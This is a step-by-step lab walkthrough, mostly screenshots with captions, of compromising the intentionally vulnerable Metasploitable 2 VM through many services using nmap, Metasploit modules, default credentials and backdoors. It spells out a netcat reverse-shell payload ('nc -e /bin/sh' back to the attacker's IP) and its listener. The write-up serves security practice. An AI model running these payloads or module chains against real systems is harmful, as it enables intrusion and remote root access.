# Metasploitable-2

**Description:**
This screenshot shows the VulnHub (and Rapid7) page for Metasploitable 2, a deliberately vulnerable Linux virtual machine used for security testing and practice.

Author: Metasploit

Date release: 12 Jun 2012

<img width="1079" alt="1" src="https://github.com/user-attachments/assets/69e77642-ff6e-423a-ae2a-b1d08a1d73e4" />

# Metasploitable 2 VM Setup

Here, we can see the VirtualBox (or VMware) settings for the Metasploitable 2 virtual machine, including memory, network adapters, and other configuration details before powering it on.

<img width="1079" alt="2" src="https://github.com/user-attachments/assets/e725e719-e3c2-44d4-bf2a-6ac981d470d0" />

# Metasploitable 2 Boot Screen

After starting the VM, Metasploitable 2 displays its boot sequence and ASCII banner. The default login credentials (msfadmin:msfadmin) are shown in the welcome message.

<img width="470" alt="3" src="https://github.com/user-attachments/assets/1c3a3fee-b9bd-4c11-a6f1-ac82ffae3a37" />

# Discovering the VM IP Address

Using netdiscover to identify live hosts on the local network. The scan reveals the IP address of the Metasploitable 2 VM (192.168.164.130 in this example).

<img width="527" alt="4" src="https://github.com/user-attachments/assets/144e3128-b090-49db-ac90-4acfa35ae471" />

# Nmap Scan Results

Running Nmap on the Metasploitable 2 IP address shows multiple open ports and services (FTP, SSH, Telnet, SMTP, etc.). This confirms the system is intentionally exposed for testing various exploits.

<img width="415" alt="5" src="https://github.com/user-attachments/assets/3d013ccf-30a1-4f59-a4e1-47b150b5b872" />

# Let's start with Port 21 Vulnerability Scan

Using nmap --script vuln to detect known vulnerabilities. Nmap identifies the vsftpd 2.3.4 backdoor vulnerability, indicating a potential remote root exploit.

<img width="602" alt="6-p21" src="https://github.com/user-attachments/assets/881a2196-2eb7-4b7b-90fd-8804d96b5fd7" />

# Searching for vsftpd 2.3.4 Exploit

A quick Google search for “vsftpd 2.3.4 exploit github” yields multiple public repositories containing proof-of-concept code and scripts for exploiting the vsftpd backdoor.

<img width="652" alt="7" src="https://github.com/user-attachments/assets/b7eb2c2a-53d2-40b8-a49c-0cc48e80a574" />

# vsftpd 2.3.4 Exploit (GitHub Repo)

An example of a Python exploit script on GitHub that targets vsftpd 2.3.4. The repository provides usage instructions and explains how the backdoor was introduced into the service.

<img width="1079" alt="8" src="https://github.com/user-attachments/assets/7aa6d29c-81bf-4509-a080-55871f423f1f" />

# Reviewing the Exploit Code

Here is the raw Python code for the vsftpd 2.3.4 exploit. It demonstrates how the backdoor is triggered and allows remote code execution.

<img width="593" alt="9" src="https://github.com/user-attachments/assets/4b9bed3b-0cb8-4986-942f-2472810654a1" />

# Exploit in Action

Executing the exploit against Metasploitable 2 at 192.168.164.130:21. The result shows we’ve successfully gained a root shell (uid=0(root) gid=0(root)), confirming that the vsftpd backdoor was exploited successfully.

<img width="344" alt="10" src="https://github.com/user-attachments/assets/c52035f1-0c42-4466-bd42-38fd34aaea5d" />

# Reverse Shell Cheat Sheet

This screenshot displays a Reverse Shell Cheat Sheet resource (e.g., from Pentestmonkey). It lists various commands in different languages (Bash, Python, PHP, Ruby, Netcat, etc.) to obtain a reverse shell on a target machine.

<img width="1079" alt="11" src="https://github.com/user-attachments/assets/06ab0f5b-0729-4a86-ad73-599594d9cecb" />

# Triggering vsftpd Exploit with Reverse Shell

Here, the vsftpd-exploit.py script is executed with a custom payload: nc -e /bin/sh 192.168.164.128 1234. This forces Metasploitable 2 to open a reverse shell back to our attacking machine on port 1234.

<img width="475" alt="12" src="https://github.com/user-attachments/assets/cc2fc3dc-660f-4118-9e2e-bac800e674dd" />

# Netcat Listener

We start a Netcat (nc) listener on port 1234 using sudo nc -lvnp 1234. The shell connection from the Metasploitable 2 VM successfully connects, giving us a remote root shell (uid=0(root) gid=0(root)).

<img width="422" alt="13" src="https://github.com/user-attachments/assets/84957642-1939-40f3-9690-d8190fc1f55d" />

# Nmap Scan on SSH (Port 22)

An Nmap scan (nmap -p22) is performed against Metasploitable 2, confirming that OpenSSH 4.7p1 is running. This helps us identify potential SSH-related vulnerabilities or default credentials.

<img width="650" alt="14-p22" src="https://github.com/user-attachments/assets/d9e73b69-a236-46c2-aa57-a9d7c54f870c" />

# Searching for Metasploit SSH Modules

In Metasploit, we use search ssh_login to locate relevant modules. The auxiliary/scanner/ssh/ssh_login module appears, which can be used to brute-force or test known SSH credentials.
<img width="932" alt="15" src="https://github.com/user-attachments/assets/6a9abe03-6a02-4871-9a3c-3894f3853688" />

# Metasploitable Login Screen (Repeat)

Another view of the Metasploitable 2 login prompt, reminding users never to expose this vulnerable VM on an untrusted network. The default credentials are once again displayed: msfadmin:msfadmin.

<img width="415" alt="16" src="https://github.com/user-attachments/assets/5df68593-e7f0-4df7-aa8a-4306ddafcd38" />

# Configuring SSH Login Module

This screenshot shows the ssh_login module options in Metasploit. Various parameters can be configured, such as RHOSTS (target IP), RPORT (SSH port), USER_FILE, PASS_FILE, and more.

<img width="933" alt="17" src="https://github.com/user-attachments/assets/b8f7ab41-49e7-4045-a233-334063d46e80" />

# Gaining Sessions with SSH_Login

After running the ssh_login auxiliary module, we obtain valid SSH credentials. Metasploit automatically opens sessions for each successful login, granting shell access to Metasploitable 2.

<img width="905" alt="18" src="https://github.com/user-attachments/assets/51d1b60a-073d-431c-9a64-c2e955a4600b" />

# Nmap Scan on Telnet (Port 23)

An Nmap scan against port 23 shows that Telnet is open on the Metasploitable 2 machine. The scan results confirm the OS as Linux and suggest another potential attack vector.

<img width="655" alt="19-p23" src="https://github.com/user-attachments/assets/e6486dad-a8af-4fb3-bafb-a69fa227b1b9" />

# Searching for Telnet Login Modules

Using search telnet_login in Metasploit, we discover the auxiliary/scanner/telnet/telnet_login module. This module can brute-force or test known credentials against Telnet services.

<img width="830" alt="20" src="https://github.com/user-attachments/assets/02149fab-528b-4f60-969a-27620cf59551" />

# Telnet Login via Metasploit

After running the auxiliary/scanner/telnet/telnet_login module, we successfully log in to Metasploitable 2 via Telnet using the default credentials (msfadmin:msfadmin). We gain a command shell, confirming that Telnet is open and vulnerable to simple credential attacks.

<img width="671" alt="21" src="https://github.com/user-attachments/assets/970e332d-8e85-435c-a213-ca7ce846a2d2" />

# Nmap SSL Scan

An Nmap scan (nmap --script=ssl-poodle -p25) checks for potential SSL/TLS vulnerabilities on port 25. The output references OpenSSL details and indicates whether the service is vulnerable to attacks like POODLE or other SSL-based exploits.

<img width="481" alt="22-p25" src="https://github.com/user-attachments/assets/52f7892e-7844-4b19-991c-8bb88feafe96" />

# Metasploit SMTP Scanner

Here, Metasploit is launched, and we use search smtp_enum to find modules for enumerating SMTP services. This is useful for discovering valid email accounts or usernames via VRFY/EXPN commands.

<img width="668" alt="23" src="https://github.com/user-attachments/assets/317744ee-ab39-492a-a9da-f30953514cd2" />

# Configuring SMTP Enumeration Module

The auxiliary/scanner/smtp/smtp_enum module is selected, and its options are displayed. We can set parameters like RHOSTS, RPORT, and user/password lists to attempt user enumeration on the SMTP service.

<img width="1073" alt="24" src="https://github.com/user-attachments/assets/e0745aa9-f1d4-47b2-83a5-4e9efeecf7de" />

# Testing SMTP with Netcat

Using Netcat to manually interact with the SMTP service on port 25. Commands like VRFY ftp, VRFY mysql, and others help confirm whether certain users exist on the Metasploitable 2 system.

<img width="538" alt="25" src="https://github.com/user-attachments/assets/c9f56c93-5197-4d59-9c92-c2a3627022ae" />

# Nmap Scan on HTTP (Port 80)

An Nmap scan (nmap -A -p80) is run against the Metasploitable 2 host to identify the web server. The result shows Apache 2.2.8 (Ubuntu) DAV/2 and additional OS details.

<img width="641" alt="26-p80" src="https://github.com/user-attachments/assets/07733f13-5f5e-457a-8c57-75edcb094284" />

# Searching for HTTP Version Module

In Metasploit, search http_version locates the auxiliary/scanner/http/http_version module. This module can help identify the exact HTTP server version, which is useful for targeting known vulnerabilities.

<img width="866" alt="27" src="https://github.com/user-attachments/assets/f76b248f-2cc8-4bf6-8e55-e22916a18384" />

# PHP Info Page

Visiting the target’s web server reveals a PHP info page showing PHP 5.2.4-2ubuntu5.10. This information is crucial for pinpointing exploits that target specific PHP versions.

<img width="1079" alt="28" src="https://github.com/user-attachments/assets/fa803950-6917-4502-9493-c3898a6acd11" />

# Searching for PHP CGI Injection Exploit

Using search php_cgi in Metasploit locates the php_cgi_arg_injection exploit. This vulnerability allows remote code execution by injecting arguments into the PHP CGI interface.

<img width="773" alt="29" src="https://github.com/user-attachments/assets/f4264f2f-55df-4153-9b76-6598b9350aa0" />

# Gaining Meterpreter Session

After setting the RHOSTS to 192.168.164.130 and exploiting the php_cgi_arg_injection module, we obtain a Meterpreter session with full shell access. We confirm the target OS, user privileges, and can now pivot to further post-exploitation steps.

<img width="694" alt="30" src="https://github.com/user-attachments/assets/146872ae-cc9f-4a76-8a54-7c4db3face1a" />

# SMB OS Discovery with Nmap

Using Nmap with the smb-os-discovery script (nmap -p 139,445 --script smb-os-discovery 192.168.164.130) to gather SMB information about the Metasploitable 2 host. It reveals OS details, NetBIOS name, domain, and system time.

<img width="426" alt="31-p139,445" src="https://github.com/user-attachments/assets/1024390b-84cc-4baa-a501-083b0a18a222" />

# Enumerating SMB Shares with smbclient

We query the target using nblookup (or similar commands) and then use smbclient with an anonymous login (-N) to list available shares. The results show default shares like ADMIN$, IPC$, and other exposed resources on the Metasploitable 2 system.

<img width="491" alt="32" src="https://github.com/user-attachments/assets/8ea28ed4-b2ca-4a32-85a8-75de8fd2f037" />

# Using enum4linux for SMB Enumeration

Running enum4linux (enum4linux -v 192.168.164.130) to gather more detailed SMB and NetBIOS information. This includes domain/workgroup names, session checks, and SIDs for the Metasploitable 2 host.

<img width="625" alt="33" src="https://github.com/user-attachments/assets/d0e75b53-204f-4ca2-9c66-8b70c9cdc389" />

# Searching for Samba usermap_script Exploit

In Metasploit, we use search samba usermap to locate the exploit/multi/samba/usermap_script module. This is a known vulnerability (CVE-2007-2447) that can lead to remote code execution on certain Samba versions.

<img width="756" alt="34" src="https://github.com/user-attachments/assets/9ae725c9-6e00-43b1-8cdc-d3137f0d78b3" />

# Exploiting Samba usermap_script

After configuring and running the usermap_script exploit (exploit/multi/samba/usermap_script), we successfully gain a remote shell with root privileges (uid=0(root) gid=0(root)), demonstrating a classic Samba vulnerability on Metasploitable 2.

<img width="702" alt="35" src="https://github.com/user-attachments/assets/19587fd2-66d5-4dc6-8325-98f50e70a7bf" />

# Scanning R-services with Nmap

An Nmap scan against ports 512, 513, and 514 (nmap -A -p 512,513,514 192.168.164.130) checks for rsh, rexec, and rlogin services. These legacy “R-services” can be insecure if misconfigured.

<img width="629" alt="36-p512,513,514" src="https://github.com/user-attachments/assets/ffc01118-f045-4d06-90dc-be7acc1d9c99" />

# Rlogin Access as Root

Demonstrating rlogin (rlogin -l root 192.168.164.130) to the Metasploitable 2 machine, resulting in direct root access without additional authentication prompts. This highlights how dangerous R-services can be if left unsecured.

<img width="559" alt="37" src="https://github.com/user-attachments/assets/0c722ba1-e5c2-4fb2-8d9c-ab98ea7546c1" />

# Nmap Scan for Java RMI (Port 1099)

Here, we run Nmap (nmap -A -p1099 192.168.164.130) to detect a Java RMI service listening on port 1099. The scan output indicates a GNU Classpath grmiregistry, suggesting potential vulnerabilities in RMI configurations.

<img width="655" alt="38-p1099" src="https://github.com/user-attachments/assets/1fd4135c-06db-4f1f-b6d1-e40f885cedaa" />

# Searching for Java RMI Exploits

Within Metasploit, using search java_rmi finds modules like exploit/multi/misc/java_rmi_server. This module targets insecure RMI registry configurations that allow remote code execution.

<img width="892" alt="39" src="https://github.com/user-attachments/assets/3915bbfb-0c46-450a-a91b-af1e3e49e1e9" />

# Gaining Meterpreter via Java RMI Exploit

By setting RHOSTS to 192.168.164.130 and running the java_rmi_server exploit, we successfully obtain a Meterpreter session on Metasploitable 2. The shell output confirms system details, user privileges, and directory listings.

<img width="574" alt="40" src="https://github.com/user-attachments/assets/bbcba3ee-9e30-489c-8306-90449d08c447" />

# Nmap Scan on Port 1524 (Bind Shell)

Using Nmap with -A -p1524 against Metasploitable 2, we discover a bind shell service labeled as “bindshell Metasploitable root shell.” This indicates an open backdoor on port 1524 that could grant direct root access.

<img width="641" alt="41-p1524" src="https://github.com/user-attachments/assets/704a5166-1265-42e0-993b-3d55c163ad22" />


# Connecting to the Bind Shell

By using Netcat (nc 192.168.164.130 1524), we connect to the bind shell and immediately gain a root shell on Metasploitable 2. The directory listing (ls -la) confirms our elevated privileges.

<img width="623" alt="42" src="https://github.com/user-attachments/assets/cbbf1d6f-3047-405c-bf24-bb80f21f9882" />


# Scanning MySQL (Port 3306) with Vulnerability Scripts

An Nmap scan (nmap --script=vuln -A -p3306) checks for known MySQL vulnerabilities on Metasploitable 2. The output references potential CVEs (e.g., CVE-2012-2122, CVE-2016-6662), indicating insecure MySQL configurations that can be exploited.

<img width="668" alt="43-p3306" src="https://github.com/user-attachments/assets/899dd445-4790-432e-9e07-a9d927b78b5f" />


# Accessing MySQL Databases

Here, we attempt to log into the MySQL service as root (e.g., mysql -h 192.168.164.130 -u root). We list available databases (like dvwa, owasp10, userdb) and discover tables, including user credentials. Notably, default or weak passwords are often found in Metasploitable 2.

<img width="502" alt="44" src="https://github.com/user-attachments/assets/ac0ccdbd-4c4c-4d1a-a8cc-a82cd4e22ecb" />

# Nmap Scan on DistCC (Port 3632)

Using Nmap with --script=vuln -A -p3632, we detect a DistCC Daemon running on Metasploitable 2. The results indicate a known vulnerability (CVE-2004-2687) that allows remote command execution.
<img width="671" alt="45-p3632" src="https://github.com/user-attachments/assets/665a079f-d98d-4011-b5ab-3f5880440683" />


# Searching for DistCC Exploit in Metasploit

In Metasploit, we run search distcc to locate the exploit/unix/misc/distcc_exec module. This module exploits the DistCC service by sending malicious commands that the server executes remotely.

<img width="716" alt="46" src="https://github.com/user-attachments/assets/cd4dda9c-9c12-4e86-a55a-7acfb8df2652" />


# Exploiting DistCC to Get a Shell

After configuring the distcc_exec exploit and selecting a suitable payload, we successfully gain a remote shell as the daemon user on Metasploitable 2. We confirm our privileges with commands like id and uname -a.

<img width="859" alt="47" src="https://github.com/user-attachments/assets/92e8389c-c401-45f3-b0c5-b00b9ccbd899" />


# Nmap Scan on PostgreSQL (Port 5432)

An Nmap scan (nmap --script=vuln -A -p5432) identifies PostgreSQL 8.3.7 running on Metasploitable 2. The output also notes potential SSL vulnerabilities (like POODLE or CCS injection) if SSL is enabled on the service.

<img width="505" alt="48-p5432" src="https://github.com/user-attachments/assets/83bc18fc-2735-44d4-88ae-e8b8f943254f" />

# Searching for PostgreSQL Modules in Metasploit

Within Metasploit, we use search postgresql to discover a range of PostgreSQL-related modules. These include auxiliary scanners (for enumeration) and exploits (for privilege escalation or remote code execution) targeting PostgreSQL services.

<img width="917" alt="49" src="https://github.com/user-attachments/assets/16d2e9e0-dc01-4a4f-8469-de9c8161fc04" />


# Configuring PostgreSQL Exploit

Here, we select the exploit/linux/postgres/postgres_payload module in Metasploit and configure the necessary options (e.g., RHOSTS, RPORT, LHOST, LPORT). This module attempts to gain a remote shell by injecting and executing malicious code through the PostgreSQL service.

<img width="864" alt="50" src="https://github.com/user-attachments/assets/e386b25f-e99e-427f-985e-d74682b2503b" />

# PostgreSQL Exploit – Meterpreter Session

After configuring and running the postgres_payload exploit (exploit/linux/postgres/postgres_payload), we successfully obtain a Meterpreter session on the Metasploitable 2 host. System information confirms we’re running on an i686 architecture with Linux kernel 2.6.x.

<img width="742" alt="51" src="https://github.com/user-attachments/assets/7d55b38f-48e3-4185-ae37-0f300a4b08b9" />

# Nmap Scan on VNC (Port 5900)

We run Nmap with --script=vuln -A -p5900 to probe the VNC service on Metasploitable 2. The output indicates that VNC (Virtual Network Computing) is open, which could allow remote desktop connections if not properly secured.

<img width="644" alt="52-p5900" src="https://github.com/user-attachments/assets/46164e8c-e319-43c8-99d5-f9ea265b5a8b" />


# Searching for VNC Modules in Metasploit

Using search vnc_login in Metasploit locates auxiliary/scanner/vnc/vnc_login, a module for brute forcing or testing default credentials against a VNC service. This can reveal weak or no-password configurations.

<img width="908" alt="53" src="https://github.com/user-attachments/assets/93a8804f-849e-4f65-9c67-545a0722b1a3" />

# Successful VNC Connection

We connect to the Metasploitable 2 machine via VNC (e.g., vncviewer 192.168.164.130). The screenshot shows a remote desktop session, indicating default or weak authentication is enabled.

<img width="1009" alt="54" src="https://github.com/user-attachments/assets/ee1384d0-8eb6-433d-9962-41a60226794f" />

# UnrealIRCd Nmap Scan (Port 6667)

Here, we run nmap --script=vuln -A -p6667 and discover an UnrealIRCd service. The scan references a known backdoor vulnerability (e.g., CVE-2010-2075) that allows remote command execution if the service is unpatched.

<img width="738" alt="55-p6667" src="https://github.com/user-attachments/assets/e154ac50-cc5e-4618-8041-baafc58f40f4" />


# Searching for UnrealIRCd Exploit

In Metasploit, search unreal_ircd locates the exploit/unix/irc/unreal_ircd_3281_backdoor module. This is a known exploit that leverages the backdoor introduced in certain UnrealIRCd versions.

<img width="731" alt="56" src="https://github.com/user-attachments/assets/1f467881-ba4d-4cef-bc65-c06a81dfedfc" />


# Exploiting UnrealIRCd Backdoor

After setting the RHOSTS, RPORT, and choosing a payload, we exploit UnrealIRCd and gain a remote shell. The shell output (id, directory listings) confirms root-level access on the Metasploitable 2 host.

<img width="718" alt="57" src="https://github.com/user-attachments/assets/d4aad8e2-9817-4a0d-ba17-74ae1a1c2b1b" />

# Nmap Scan on Apache Tomcat (Port 8180)

Using Nmap with --script=vuln -A -p8180, we detect Apache Tomcat/Servlet JSP Engine 1.1. This indicates a Tomcat instance running on an alternate port (8180) that might be vulnerable to known exploits or misconfigurations.

<img width="647" alt="58-p8180" src="https://github.com/user-attachments/assets/e5e3d93b-b3dd-400f-92ff-dabcfb4ef13d" />


# Searching for Tomcat Exploits

We run search apache_tomcat in Metasploit, finding multiple modules related to Tomcat exploitation, such as remote code execution via tomcat_mgr_deploy, credential brute force, or weak default credentials.

<img width="1054" alt="59" src="https://github.com/user-attachments/assets/00b66299-4f6f-42c8-a5b6-854152512f18" />


# Exploiting Tomcat Manager for a Meterpreter Shell

Using exploit/multi/http/tomcat_mgr_deploy in Metasploit, we deploy a Java/Metasploit payload through the Tomcat Manager application. Once successful, a Meterpreter session is opened, granting remote access to the Metasploitable 2 system. System commands confirm the session is running with the postgres user privileges (or other specified user).

<img width="606" alt="60" src="https://github.com/user-attachments/assets/ab58a2be-0c92-4d26-a708-8da92aa34f6a" />












































